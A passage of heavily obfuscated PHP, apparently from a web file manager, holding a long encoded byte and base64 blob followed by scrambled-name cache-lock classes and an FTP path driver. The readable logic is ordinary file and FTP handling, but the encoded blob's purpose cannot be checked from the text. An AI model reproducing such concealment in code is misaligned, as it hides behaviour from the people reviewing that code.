2\146\113\275\324\1\344\71\213\25\266\305\57\240\120\73\175\236\120\120\114\164\273\211\40\342\273\52\60\56"."\274\356\52\324\25\10\165\202\63\31\130\20\365\300\104\244\5\331\310\114\343\175\10\73\2\1\15\20\352\204\175\112\302\123\1\141\241\355\265\271\362\42\173\255\362\76\304\141\100\310\144\152\41\74\360\51\264"."\371\241\376\121\270\136\371\130\234\364\0\354\343\230\355\203\314\304\73\53\354\131\273\254\62\14\327\344\242\121\52\107\45\344\2\274\363\111\342\323\165\320\361\344\333\54\64\20\204\16\364\40\47\210\321\203\126"."\1\344\353\367\305\302\276\325\336\262\4\350\107\272\162\12\130\357\43\76\52\376\10\360\376\0\362\131\147\201\17\364\57\357\17\14\126\102\215\364\5\271\54\41\44\165\172\372\43\61\141\343\212\167\64\140\137"."\306\266\64\124\351\75\241\47\232\32\343\154\232\61\137\156\124\340\47\63\205\256\371\334\65\303\270\223\331\0\320\115\121\27\367\250\102\262\241\323\131\122\5\344\137\206\144\20\217\172\304\144\207\124\361\240\207".base64_decode('7bqIMYjtDDOu5mXqCTdHv51jFnXQyRR1zIOs36hkIN5/F9glIjE500GqjozChYO9vBlS0mLUrzG9')."\x3f\xb4\x9a\x57\x28\x2\xbe\x63\x24\x18\xab\xc0\x9d\x8c\x27\x61\x16\xc5\x37\x92\x84\xe7\xdc\x41\xac\x87\xbb\x74\x15\x4c\xfd\x9c\xd\x12\x6b\x51\xc\x97\x8c\x23\xf3\x84\x4\xac\x6d\x5e\xc1\x5c\xd0\xe6\x79\x41\x70\x8\x8b\xac\xd0".base64_decode('w8U4859js++j7mYl0bKOOo2FBaAnfmALDDENFAtfc+YtE7Ogb5ZlwWnQAI6zMjHFgEpdA1TsqpRS')."\341\123\50\111\350\321\4\335\354\121\237\170\244\223\170\137\231\264\277\33\235\115\304\271\212\350\165\226\230\317\221\316\165\66\112\2\171\101\336\43\120\4\76\262\140\335\310\15\102\263\34\107\203\36\43\24\76"."\370\334\340\20\277\77\304\206\26\75\124\304\142\272\140\214\246\44\351\320\241\207\176\52\256\45\30\210\136\2\32\250\224\216\73\13\46\167\131\334\203\332\20\300\224\267\246\243\57\212\225\111\341\127\237\54\156"."\x12\x6d\x85\xe8\x38\xad\x4b\xe1\xce\x4c\x50\x2e\xde\xe\xee\x69\x15\x80\xc0\xde\x7\x26\xb\x1d\xc3\x7d\xe0\xe1\x97\x8d\xa8\x3f\x58\x4f\x32\x69\x7\x47\x34\x6\x2c\xf7\xa3\xe7\x62\x9e\x6c\x89\xcb\x7e\xb0\x29\xd\xfb\x2\xfd\x35"."\265\120\312\262\370\40\350\233\140\116\325\301\110\242\165\274\217\76\352\150\210\21\232\312\350\324\260\104\260\153\112\113\156\6\142\130\143\112\234\261\155\302\110\173\203\156\6\352\240\335\304\336\320\41\306\326\360"."\5\3\261\320\0\221\131\307\260\25\25\341\245\55\314\133\47\335\22\215\345\324\204\344\17\364\300\375\170\227\57\274\134\112\53\246\304\5\41\164\273\141\235\371\310\201\4\72\15\244\204\37\247\252\61\50\350"."\104\47\47\116\213\253\42\266\113\21\335\170\302\202\312\12\306\243\56\26\7\217\135\234\111\146\174\153\303\245\202\103\131\16\361\373\102\36\270\313\261\362\12\4\46\373\37\153\71\23\12\274\100\250\374\355\142".base64_decode('he8S/Cw/dBEyqPmSaqicDdCumhDxy/oSNUVAgI7LuEU661b2nTJLaR7HOOSFNMEmFw+J+FJggTqt')."\x21\x57\xf3\x74\xfc\x49\x54\xb8\xe5\x2e\xe8\xb2\x6a\x28\x2\xc0\xf2\x8e\x20\xc1\x8f\x61\x2c\xc\xb\xf9\x7a\x7a\x23\xff\x75\x71\x6a\x92\xbf\x9\x68\xab\x8c\x9a\xa4\x52\x22\xf3\x13\xe\x64\x43\x54\x1e\xd6\xf8\xb1\x54\x1\x2a\x35".strrev('’%Á$Ë"’'."\n".'q¢íº‰(ÂC/˜b|Ø•øÈj£©“ İ~õø8'."\n".'¡k¤rYã¸ÛÇ rëàşp')."\x9b\x9e\x47\x32\xbf\xe1\xf0\x58\xda\x4b\x1d\xf4\xb8\x4c\x1a\x82\x60\x6e\xb5\xca\x7d\xc8\x52\x47\xba\xb0\x28\xf2\x69\x58\x37\x6c\xc9\xac\x6a\xe8\xb1\xf\x6a\xf1\x4a\xac\xf0\x59\xf3\x70\xd4\xee\x79\x37\x23\x4a\xd3\x65\x65\x41\x59"."\173\372\162\100\76\211\33\371\63\4\251\115\252\107\276\42\270\7\125\251\225\276\143\300\77\201\236\202\363\346\12\246\305\50\273\127\65\370\173\44\110\330\340\233\52\50\301\151\271\211\62\200\305\352\337\117\253"."\xc1\x1c\xb9\x42\x83\x96\x7c\x4a\x13\x5b\x8d\x98\x9c\x17\x30\x13\x7\xa\x61\x63\x6f\x7\x3c\x14\x37\x83\x88\xa4\xfc\x4a\x49\xb1\x66\x9f\xb6\x2c\xc3\xbe\x3a\x70\xa1\x5\x70\x1\x68\x9e\xc2\x35\xa4\x29\x44\x10\x51\x2c\xfc\x16\x45"."\4\322\105\346\262\202\323\177\372\13\275\363\60\121\26\326\127\50\220\30\131\105\311\57\145\255\366\242\301\0\166\22\45\26\112\363\31\366\266\257\220\330\247\160\255\71\122\127\207\155\265\200\216\357\344\74\143".base64_decode('UXAYARJ2jAQCfFrRNIFqmA8qtlFFDmfZgTVYtCOAxaUdWOyAzIHHOibEsOjJF9Urwmxz1CQbIfES')."\xdf\x49\x53\xa1\x4a\x1a\x65\x11\x9c\x6a\x71\xaa\x40\xc5\x8c\xef\x88\xb9\xb1\x45\x40\x8\xbb\xc6\x74\x61\xdf\x23\x38\x45\x7\xbb\x7\xe6\xff\xd6\x82\x46\xb8\x6\xd8\x61\xf1\xb3\x56\x9b\x97\x1c\x22\xa\x60\x8f\x39\xc5\xbc\xf\x3f".base64_decode('2WCB6sLuRPSljP0EcW/4BB18LYgdA5Fmi0VS50zoB+5fwERlluTucmdO0HUnlSwEV7fEs5ZL3D4Q')."\x4\xa9\x55\xe2\x3\x6c\x99\x40\x50\x3a\x3\x82\x9b\x3\x5\xd0\xac\x14\x65\xcc\xca\x50\xcb\xac\x44\x28\x8c\xe4\xd0\x5b\x9d\x8c\xfa\x60\x8f\x92\x9f\x2e\x25\xc5\xa4\x6f\x18\xe7\xdb\x34\xf1\xc1\x1a\xda\x4\x4c\xec\x65\xdf\x40\xbf"."\x90\x2f\x3a\x70\x1b\x1d\x8c\xe0\x55\xc3\x8f\x34\x3c\x8d\x30\x96\x45\x1d\xf0\x76\x14\xfc\xe0\xfd\x84\xe1\xe0\xef\x1b\x38\xf0\x4d\x7\x32\x2b\xb2\x93\x5b\x96\xbb\xd3\x2\x3d\xce\xbf\xf\x2b\x1c\x11\xeb\x62\x91\x81\xed\xe2\x2f\xeb"."\x34\x5b\x86\x90\xbd\x63\x23\x5a\xb9\xa7\xb\xee\xcc\x2a\x5f\xcc\x71\xaf\x61\x20\x62\xdd\xe\x94\x35\x58\x68\x61\x51\xcf\x3a\x90\x7e\xb2\x83\x3e\xe4\x68\xeb\xe\xa1\xe\x31\x53\x68\x23\x13\x3d\x6d\x3\x56\xa1\x77\xbf\xb6\x74\xe2".base64_decode('GhlJ/0COwt5CcFILuhmqjKZaKBNsv/mZO34PtmBfI1blko1N8xeLG24+ctwJEbkLIbpU9GyR0YJk').base64_decode('pTSJPkIrzm2UaPXwTJ4NFni7jQf/VxPCU0k2x5mEI0BWstAFlb7y/18PHKfyN3SOy2NWl3Zkk82T')."\5\11\133\334\13\200\321\360\260\51\145\146\2\371\354\204\275\311\370\121\325\377\276\322\124\134\226\255\116\314\120\52\227\25\40\3\241\137\246\347\342\151\333\312\217\305\15\141\154\205\323\41\305\14\100\237\6"."\144\344\205\15\30\110\261\240\11\253\77\210\61\301\207\277\304\6\53\106\153\62\315\216\211\316\135\136\35\364\256\3\167\235\202\310\324\102\262\302\373\306\342\63\11\250\240\210\340\136\262\274\150\264\145\47\225"."\44\64\213\224\42\220\257\101\117\17\173\371\2\336\5\363\52\300\30\347\115\246\306\123\114\315\372\370\116\200\36\174\2\361\301\262\73\0\161\156\174\46\314\274\244\15\50\312\126\302\114\6\63\114\25\44\174".base64_decode('Iqxy6Q81VHALRU4VeE95mMQhvuoMoozqyKpC5j7yP40/KywafH3goX5qnwEjwpkakqFZYkYUr+Hj')."\x61\x38\x44\x85\x45\x56\xb\xc4\xe7\x2a\x4d\x0\x5c\x9\x48\x7d\x64\xe5\x42\x41\xca\x5b\xa1\x2\x37\xb2\x9b\x86\x79\x48\xef\x59\x79\x5\x6a\xd0\x57\x2c\x7f\xb0\x38\xe6\xff\xbc\x87\x48\x71\xb6\xca\x59\x39\xf9\x3e\x62\x2a\x21\x2a".strrev('\\”DR®êMF¸€]Ö\\lqñ'."\r".'WË6JìOŠwlFß@ô\\Ìœ6ú8ô·?3ŠÂğšEj\\"F%‡')."\x2b\x6c\x83\xa8\x44\xc2\x1b\x90\x57\x13\xa3\x15\x7c\x3f\xc1\xae\x87\x6a\x50\x2\xc3\x16\x96\xb9\x32\x34\xce\x43\xc0\x6a\xc8\xd4\x17\x69\x8\x6d\x7\xa0\x88\x44\xe4\x5c\xcb\x8b\x28\x1\x76\x63\x5f\x4b\xfc\x6\x8e\x2c\xa3\xbc\x0"."\x4e\x40\x7a\xec\x27\xb2\x1\xb\xa8\x8c\x79\x44\x2c\x2b\x87\x5\x28\x76\xf\x21\x2\xf8\xda\x0\xa5\x7\x4b\xe\xe8\x2b\xaa\x43\x90\xc1\x31\x92\x21\xf6\xad\xe5\xb4\xb2\xdc\x15\x58\x79\x6e\x36\x1d\xc5\x2c\x7c\xf1\xc0\xf1\x18\xa8".base64_decode('qPWMQCwa37LDnWsIbjJdtuLZ/Kk4Z1QDn56KOykQEitKJ11Q15AsYIWyFUGwGBPUtcJ2tmU70QXC')."\xbb\x70\xdb\x81\x5f\x51\xc5\xcf\xdb\xc3\x27\x20\x1\xf3\x92\xc2\x3\x7d\x35\xc8\x6d\x3c\x4\xc0\x0\x7e\x89\xef\x38\x22\x9a\x1c\x27\xcd\x90\x84\xff\xf0\x7b\x8c\x35\x30\x19\x16\x72\x9c\xe4\xeb\xe7\x2f\x62\xd7\x4a\xfc\x1d\x41\x9c"."\116\250\27\10\263\335\32\243\3\170\173\53\50\372\130\37\301\200\176\253\255\163\240\275\22\132\102\323\15\1\115\170\346\145\5\164\347\217\203\175\152\236\276\275\102\110\233\146\47\43\201\143\225\312\7\3\37"."\x36\x2d\x43\x4\xa5\x39\x2a\x42\x2\x21\x59\xe2\x3\x8a\x76\x7f\x78\x43\x67\xd9\xd7\x11\x5\x28\x11\x24\x5c\xe7\x40\x53\x0\xab\xb7\x5e\x94\x88\xc0\xf4\xe5\x55\x52\x82\x70\xb\x61\xbd\xf\x62\x4f\xc7\x97\xf1\xad\xa2\xea\x17\x92"."\x51\x2e\xfa\x88\x1f\xf8\x85\xef\x63\xf8\xb8\x2b\xd\x94\x8c\xcf\x48\x3d\x25\x99\x29\x7\xd9\x73\xd\x58\x44\x63\xe1\xf6\x28\x81\x8\x92\x6f\x59\x50\xc6\x38\xa8\x25\xfa\xc7\x53\x50\xed\x39\xcc\x8c\xaa\x27\x3b\xd4\x7c\xd2\x8e\x5f"."\314\307\31\224\243\203\301\350\250\4\6\142\25\147\335\66\270\260\312\160\346\51\227\370\115\2\27\110\223\311\156\271\124\1\225\31\276\63\50\200\60\124\44\7\11\317\370\160\67\317\312\230\370\165\202\227\52".base64_decode('X2MgYjmUP/NjbxeaRgxOLnTygoM8Qm4chHASzHciLgo6zXZB3ULuVBHXkW0l+SetrxExNCajARxk')."\43\340\264\100\155\236\246\341\351\42\135\155\155\111\144\37\53\24\137\161\273\153\41\5\277\120\234\170\177\64\155\206\160\345\217\160\172\265\166\261\360\162\23\117\240\213\232\146\351\174\201\267\262\206\21\314\220"."\230\150\251\216\175\150\321\136\202\323\45\6\346\320\321\35\116\363\130\223\60\276\142\253\275\230\301\336\62\234\103\57\353\37\222\247\362\247\355\37\240\335\143\277\275\345\205\10\133\231\262\253\345\210\126\41\17".base64_decode('rlHFbDgJ5uRSmyWvMaaaiUzFvDgJ5i1LppmFXbmQz5SLxjTNK+88NI1sXUcazN3BC6jT9WdF5PLP')."\21\342\261\143\243\335\164\345\132\124\74\25\230\256\26\25\221\247\255\5\307\266\335\30\127\342\207\64\245\2\7\344\27\274\345\274\226\247\125\270\156\306\145\302\205\70\144\321\310\54\113\26\357\256\53\337\156"."\207\52\316\142\303\172\355\154\203\213\35\303\135\162\22\47\235\243\171\352\325\12\144\347\336\42\241\42\267\107\267\167\16\225\355\154\376\227\51\355\345\213\202\317\337\212\16\234\35\160\373\133\276\277\314\122\237"."\x67\xa2\x7b\x6b\xbc\x13\xd1\x4c\x35\x21\xa8\xb9\x40\xa0\xe8\xa1\x19\xa7\xd3\x8f\x64\xf9\x41\x19\x91\x4\xf0\x4d\x65\x97\xa8\xb5\xbd\xfb\x8e\x53\x77\xdd\xfd\x8b\x5d\x5b\xae\xd9\x75\xde\x86\x1d\xe7\x5f\xea\xd8\x79\xd6\xe6\x9d\x9b".base64_decode('zti56ZwdZ16z47LrccLOK095+7Lzlkg7zzgRJl5y2lv33IH/3XHdXbu33L/rvi0YZcctd+2+ZfOu')."\213\256\337\171\372\257\167\376\344\352\235\27\237\176\264\320\51\240\336\72\167\364\150\271\141\255\220\356\342\107\262\26\67\343\170\315\47\247\322\370\362\10\251\72\261\13\11\270\103\163\340\245\24\47\207\65\335"."\x84\xee\x3\xc0\x12\x50\x40\xbf\x1d\x9a\x69\x52\xce\x4\xe4\x68\x84\x89\x24\x43\xe4\x9d\x48\xb8\x44\x7\x21\x7e\xfb\x0\x7\xd\x1d\x88\x23\xf2\x46\x6c\x8\x5\xc9\x35\x16\xdc\xcd\x86\x15\x9c\x8a\x98\x97\x25\x2\xf\xda\x59\x24"."\x54\x7e\xa2\xde\x5d\xb4\xdd\x9b\x71\x0\xd8\x87\xc6\xb5\x71\x42\x5d\xe8\x19\x23\x5e\x1f\x78\x22\x4e\xba\xc5\x2e\xfd\xf1\x57\x2c\x8\x79\x8b\x2a\x1\x48\x37\xcf\x70\xe3\x14\x37\xd1\xe3\x77\xa2\x32\x9c\xe4\xc1\x4d\xa6\xc7\x47\xb2".strrev('<ûy¥Óı{%”_è%Ê2Yp.°º„\' ¤²á#…òæ$@ş¦c£Å¯À‹ÈDrª¿MşdtÑ\'')."\x3e\x7f\x59\x1a\xd4\xc7\x80\x1a\xca\xf4\x4d\x58\x9c\xe4\xb\xa2\x5a\x7a\xfc\x7e\xaa\x10\x58\x5e\xb\x5f\xe7\x72\x5e\x13\x74\x5f\xc8\xcf\x81\xb\x19\x8d\x1e\xab\xda\x94\x95\xe8\xb1\x79\x58\xa6\xf3\x4f\x7c\x6\x45\xc9\xb1\x63\x2e".base64_decode('oQjroYM4zAZ9p5gFCmWbEkGegDoT/aSwEHXd2e9dwXkJE5BRg0SFLH4j6rLcnApwNFkQRxOIUFyt')."\x11\x80\x28\x10\xdb\x6e\x79\x6c\x1d\x58\x7e\x4f\x4b\xe7\xa8\xfd\x92\x18\xa6\xf2\xce\x81\x6d\x38\x86\xba\xf1\x58\xa3\xc5\x85\x6b\x24\xcc\x0\x2d\xac\x4f\xd4\x80\xc1\x61\x92\xfc\xff\x0\x5\xa5\x1a\x1b\x2d\xc6\x0\x0"."".base64_decode(''), 10, -8))); goto Dù¼†‹İˆÛ; f–ğ™†¼½: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $bæë‹Ø²ôÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bˆ‰¿Ûó = $GLOBALS[$bæë‹Ø²ôÓ[16]][$bæë‹Ø²ôÓ[348]]; self::$cachePath = $bˆ‰¿Ûó[$bæë‹Ø²ôÓ[179]][$bæë‹Ø²ôÓ[87]]; @mkdir(self::$cachePath, 511, !0); } public function lock($EŞÇòµ¬­¬, $C‡Áß×éŞÊ = 0) { goto Eè†èÕÒ; Eè†èÕÒ: $AëÔ†£ŠÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fô®›êÖ = microtime(!0); $FÒÔÀâ†¨¤ = $fô®›êÖ + $C‡Áß×éŞÊ + 0.0001; goto c‹ ’ÛÄØ; DöÑ„¢¦²: $this->unlock($EŞÇòµ¬­¬); return !1; goto d‚–†âÄ¢Ù; c‹ ’ÛÄØ: $DŒÊˆ¯İ’ = rtrim(self::$cachePath, $AëÔ†£ŠÈ[18]) . $AëÔ†£ŠÈ[768] . md5($EŞÇòµ¬­¬) . $AëÔ†£ŠÈ[769]; if (file_exists($DŒÊˆ¯İ’) && filemtime($DŒÊˆ¯İ’) && filemtime($DŒÊˆ¯İ’) < time() - 10) { @unlink($DŒÊˆ¯İ’); } do { if (file_exists($DŒÊˆ¯İ’)) { cacheLockWait(); continue; } $b÷‹Î‹ïœĞ = fopen($DŒÊˆ¯İ’, $AëÔ†£ŠÈ[770]); if (!$b÷‹Î‹ïœĞ) { return !1; } $cÄ¢·Ç«ÛÓ = flock($b÷‹Î‹ïœĞ, LOCK_EX | LOCK_NB); self::$caches[$EŞÇòµ¬­¬] = array($AëÔ†£ŠÈ[771] => $b÷‹Î‹ïœĞ, $AëÔ†£ŠÈ[179] => $DŒÊˆ¯İ’); fwrite($b÷‹Î‹ïœĞ, $FÒÔÀâ†¨¤); clearstatcache(); if ($b÷‹Î‹ïœĞ && $cÄ¢·Ç«ÛÓ) { return !0; } cacheLockWait(); } while (microtime(!0) < $FÒÔÀâ†¨¤); goto DöÑ„¢¦²; d‚–†âÄ¢Ù: } public function lockGet($BêÌö´ƒ¿†) { $aé™ĞŒ×îœ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D½³†åÃñÖ = rtrim(self::$cachePath, $aé™ĞŒ×îœ[18]) . $aé™ĞŒ×îœ[768] . md5($BêÌö´ƒ¿†) . $aé™ĞŒ×îœ[769]; return file_exists($D½³†åÃñÖ); } public function unlock($f¿í…î®) { goto e‹§ğô‹¥í; B†¦Èš‹Ó : unset(self::$caches[$f¿í…î®]); goto dØÉ‘å¬; e‹§ğô‹¥í: $c“ÎçÏ¦Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $fğë„Ğæƒ› = self::$caches[$f¿í…î®]; if (!$fğë„Ğæƒ›) { return; } goto b…„ÙãŸÓ«; b…„ÙãŸÓ«: @flock($fğë„Ğæƒ›[$c“ÎçÏ¦Í[771]], LOCK_UN); @fclose($fğë„Ğæƒ›[$c“ÎçÏ¦Í[771]]); @unlink($fğë„Ğæƒ›[$c“ÎçÏ¦Í[179]]); goto B†¦Èš‹Ó ; dØÉ‘å¬: } } class CacheLockRedis { public function lock($fª‚¸êÛŞÛ, $eÃÂãŸ¹Â = 10) { $d¾¡œƒÖ©è = Cache::init(); $F˜›æÑâ÷Ç = microtime(!0) + $eÃÂãŸ¹Â; while (microtime(!0) < $F˜›æÑâ÷Ç) { $d…¦‚¬Øèƒ = $d¾¡œƒÖ©è->get($fª‚¸êÛŞÛ); if (!$d…¦‚¬Øèƒ) { $FëµëŠÇŒ» = $d¾¡œƒÖ©è->setLock($fª‚¸êÛŞÛ, $F˜›æÑâ÷Ç, $eÃÂãŸ¹Â); if ($FëµëŠÇŒ») { return !0; } } else { if ($d…¦‚¬Øèƒ < microtime(!0)) { $d¾¡œƒÖ©è->set($fª‚¸êÛŞÛ, $F˜›æÑâ÷Ç, $F˜›æÑâ÷Ç); if ($d¾¡œƒÖ©è->get($fª‚¸êÛŞÛ) === $d…¦‚¬Øèƒ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dôƒ‰éñæ) { return Cache::init()->get($dôƒ‰éñæ); } public function unlock($bŒö¿—†ÉÑ) { return Cache::init()->remove($bŒö¿—†ÉÑ); } } class CacheLockMemcached { public function lock($Fì®‹·’©ˆ, $b¢·ïÀìõÔ = 0) { $BĞÉÙª™à³ = Cache::init(); $f•‰­µ¤Å¤ = microtime(!0) + $b¢·ïÀìõÔ; while (microtime(!0) < $f•‰­µ¤Å¤) { $Aã«Ûñß¶ù = $BĞÉÙª™à³->get($Fì®‹·’©ˆ); if (!$Aã«Ûñß¶ù || $Aã«Ûñß¶ù < microtime(!0)) { $fïÛŞË¬Ÿ… = $BĞÉÙª™à³->handle->add($Fì®‹·’©ˆ, $f•‰­µ¤Å¤, $b¢·ïÀìõÔ); if ($fïÛŞË¬Ÿ…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A¯ß¦¼Ş¹) { return Cache::init()->get($A¯ß¦¼Ş¹); } public function unlock($DßÇöàáŠ¦) { return Cache::init()->remove($DßÇöàáŠ¦); } } goto bàî¯·„À; C¸’ÕÒŒ–Í: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($cöê‡¿¢Ğœ) { parent::__construct(); if (count($cöê‡¿¢Ğœ) > 0) { $this->_init($cöê‡¿¢Ğœ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e¢šàÖ¢ïÄ) { $d‰ÀòĞ–‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; global $config; $this->appCharset = $config[$d‰ÀòĞ–‘[1143]]; $this->systemCharset = $config[$d‰ÀòĞ–‘[1144]]; if (isset($e¢šàÖ¢ïÄ[$d‰ÀòĞ–‘[1145]]) && $e¢šàÖ¢ïÄ[$d‰ÀòĞ–‘[1145]]) { $this->systemCharset = $e¢šàÖ¢ïÄ[$d‰ÀòĞ–‘[1145]]; } } public function iconvApp($bÄ´·§¦í–) { return $this->iconvTo($bÄ´·§¦í–, $this->systemCharset, $this->appCharset); } public function iconvSystem($C†Ù—–Ğ) { return $this->iconvTo($C†Ù—–Ğ, $this->appCharset, $this->systemCharset); } public function getPathOuter($d»¾Ü¦²ç¼) { goto fÖæËõøá; E¶¿‹ğ»°ˆ: if (substr($d½Áù¹¨™, 0, 2) == $B‘Úñ¼ã½[1146]) { $d½Áù¹¨™ = BASIC_PATH . substr($d½Áù¹¨™, 2); } if (substr($d»¾Ü¦²ç¼, 0, 2) == $B‘Úñ¼ã½[1146]) { $d»¾Ü¦²ç¼ = BASIC_PATH . substr($d»¾Ü¦²ç¼, 2); } $d½Áù¹¨™ = KodIO::clear($d½Áù¹¨™); goto dŞíÌŸ”ê; dŞíÌŸ”ê: $d»¾Ü¦²ç¼ = KodIO::clear($d»¾Ü¦²ç¼); $d»¾Ü¦²ç¼ = substr($d»¾Ü¦²ç¼, strlen($d½Áù¹¨™)); if (empty($this->pathDriver)) { return $d»¾Ü¦²ç¼; } goto AˆçÂ‚ˆêŞ; AˆçÂ‚ˆêŞ: return $this->pathDriver . $B‘Úñ¼ã½[18] . ltrim($d»¾Ü¦²ç¼, $B‘Úñ¼ã½[18]); goto b±Œƒï“Á™; fÖæËõøá: $B‘Úñ¼ã½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d½Áù¹¨™ = $this->iconvApp($this->pathBase); $d»¾Ü¦²ç¼ = $this->iconvApp($d»¾Ü¦²ç¼); goto E¶¿‹ğ»°ˆ; b±Œƒï“Á™: } private function _init($AË¹º»èŒ‰ = array()) { $Fë²Åé‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!function_exists($Fë²Åé‡[1147])) { show_json(LNG($Fë²Åé‡[1148]), !1); } $this->config = $AË¹º»èŒ‰; $this->charsetReset($AË¹º»èŒ‰); foreach ($AË¹º»èŒ‰ as $a…í™¹„ => $b¨©Ú÷æœø) { if (isset($this->{$a…í™¹„})) { $this->{$a…í™¹„} = $b¨©Ú÷æœø; } } return $this->_login($AË¹º»èŒ‰); } private function _login($fÔ°½Øµ®³) { goto bã‡ãˆŒö’; dˆ¶°éøâ: $EÌöôÅŠÀ÷[$a«§³çñ´³] = array($D«¼¸¦Ú®¡[1152] => $this->connect, $D«¼¸¦Ú®¡[181] => $this->host, $D«¼¸¦Ú®¡[180] => $this->scheme, $D«¼¸¦Ú®¡[182] => $this->port); return $D‹ÇƒÀŸ¹÷; goto f’¬Áøàï; bã‡ãˆŒö’: $D«¼¸¦Ú®¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $EÌöôÅŠÀ÷ = array(); $a«§³çñ´³ = md5(json_encode($fÔ°½Øµ®³)); goto cªßçØµ¾¿; cªßçØµ¾¿: if (isset($EÌöôÅŠÀ÷[$a«§³çñ´³])) { foreach ($EÌöôÅŠÀ÷[$a«§³çñ´³] as $C«—ñ¼í => $CœÂŠ”¥Ÿ™) { $this->{$C«—ñ¼í} = $CœÂŠ”¥Ÿ™; } return !0; } $EÜêËìœËÈ = parse_url(trim($this->server, $D«¼¸¦Ú®¡[18])); $this->host = $EÜêËìœËÈ[$D«¼¸¦Ú®¡[181]]; goto b§ÛÜ£êç»; c˜Ãª¨Ô¶: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $D‹ÇƒÀŸ¹÷ = @ftp_login($this->connect, $this->username, $this->userpass); goto Fù™î ‹Å½; Fù™î ‹Å½: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $C¸ïñˆ™§’ = $this->pasv == $D«¼¸¦Ú®¡[95] ? !0 : !1; @ftp_pasv($this->connect, $C¸ïñˆ™§’); goto dˆ¶°éøâ; b§ÛÜ£êç»: $d‡¦á£ç² = isset($EÜêËìœËÈ[$D«¼¸¦Ú®¡[180]]) && $EÜêËìœËÈ[$D«¼¸¦Ú®¡[180]] == $D«¼¸¦Ú®¡[1149] ? !0 : !1; $this->scheme = $d‡¦á£ç² ? $D«¼¸¦Ú®¡[1150] : $D«¼¸¦Ú®¡[1151]; $this->port = isset($EÜêËìœËÈ[$D«¼¸¦Ú®¡[182]]) ? $EÜêËìœËÈ[$D«¼¸¦Ú®¡[182]] : 21; goto c˜Ãª¨Ô¶; f’¬Áøàï: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($DÁÚ•‚¸ï, $FÙÔ·›ŠéŠ = '', $f£Æ ”‚’ƒ = REPEAT_RENAME) { if ($this->setContent($DÁÚ•‚¸ï, $FÙÔ·›ŠéŠ)) { return $this->getPathOuter($DÁÚ•‚¸ï); } return !1; } public function mkdir($EÚ¤¥­—, $eË›Áà®¢Ö = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $EÚ¤¥­— = $this->iconvSystem($EÚ¤¥­—); if ($this->isFolder($EÚ¤¥­—) || @ftp_mkdir($this->connect, $EÚ¤¥­—)) { return $this->getPathOuter($EÚ¤¥­—); } if (!$this->mkdir($this->pathFather($EÚ¤¥­—))) { return !1; } if ($EÚ¤¥­— = @ftp_mkdir($this->connect, $EÚ¤¥­—)) { return $this->getPathOuter($EÚ¤¥­—); } return !1; } public function copyFile($c…Åòš„‘, $cÄÈ×®öÀŸ) { goto ašéÚàÒî¾; aÇ©ª„ŸÑ: $this->tempFileRemve($a‚ÏÕ«ñ¨Ç); return $aÁ¿ÑËÏ·›; goto d¬¨«‚èá; b‘ïÄÍ¤Ÿ¼: $eáÄ×Æß = $this->iconvApp($a‚ÏÕ«ñ¨Ç); $this->download($c…Åòš„‘, $eáÄ×Æß); $aÁ¿ÑËÏ·› = $this->upload($cÄÈ×®öÀŸ, $eáÄ×Æß); goto aÇ©ª„ŸÑ; ašéÚàÒî¾: if (!$this->_isconn()) { return !1; } $Cš«„øÎéÁ = $this->pathThis($this->iconvSystem($c…Åòš„‘)); $a‚ÏÕ«ñ¨Ç = $this->tempFile($Cš«„øÎéÁ); goto b‘ïÄÍ¤Ÿ¼; d¬¨«‚èá: } public function moveFile($d×–‡•ÊÎÔ, $c»¼àÉáñõ) { if (!$this->_isconn()) { return !1; } $d×–‡•ÊÎÔ = $this->iconvSystem($d×–‡•ÊÎÔ); $c»¼àÉáñõ = $this->iconvSystem($c»¼àÉáñõ); $d’ø¢‘Œø = @ftp_rename($this->connect, $d×–‡•ÊÎÔ, $c»¼àÉáñõ); return $d’ø¢‘Œø ? $this->getPathOuter($c»¼àÉáñõ) : !1; } public function delFile($DÍ³ºÏîæß) { if (!$this->_isconn()) { return !1; } $DÍ³ºÏîæß = $this->iconvSystem($DÍ³ºÏîæß); return @ftp_delete($this->connect, $DÍ³ºÏîæß); } public function delFolder($f¸¾æòø) { if (!$this->_isconn()) { return !1; } $f¸¾æòø = $this->iconvSystem($f¸¾æòø); $c“×š£ƒ—÷ = $this->ftpList($f¸¾æòø); if (!$c“×š£ƒ—÷) { return @ftp_rmdir($this->connect, $f¸¾æòø); } foreach ($c“×š£ƒ—÷ as $F†£Ñ¶Ùƒ) { if ($this->isFolder($F†£Ñ¶Ùƒ)) { $F†£Ñ¶Ùƒ = $this->iconvApp($F†£Ñ¶Ùƒ); $this->delFolder($F†£Ñ¶Ùƒ); } else { @ftp_delete($this->connect, $F†£Ñ¶Ùƒ); } } return @ftp_rmdir($this->connect, $f¸¾æòø); } public function rename($fÍ‚­Ğ§Ì, $dáƒ“‘÷ªƒ) { goto Fİ‹½¶óª; A¬ÚæËÅÃ¡: $Aéƒè¤ëÉ› = rtrim($AÍ›Æ‰…ÔŸ, $F¤‘ñ´¿…Â[18]) . $F¤‘ñ´¿…Â[18] . $aØìœ˜ó¢; $Däƒªò·Š” = @ftp_rename($this->connect, $fÍ‚­Ğ§Ì, $Aéƒè¤ëÉ›); $Aéƒè¤ëÉ› = $this->iconvApp($Aéƒè¤ëÉ›); goto Aïñèê¶Øø; Bõ‰ğ‰Í: $aØìœ˜ó¢ = $this->iconvSystem($aØìœ˜ó¢); $fÍ‚­Ğ§Ì = 